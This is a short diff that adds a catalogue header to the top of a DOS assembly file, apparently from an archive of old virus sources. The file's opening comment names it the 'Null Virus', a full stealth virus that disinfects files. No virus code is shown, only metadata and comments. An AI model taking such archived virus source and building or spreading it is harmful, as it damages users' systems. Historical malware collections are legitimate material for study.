@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      N
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ;	Null Virus (souped-up version)
 ;
 ;	This virus is a simple full stealth virus, employing disinfection on
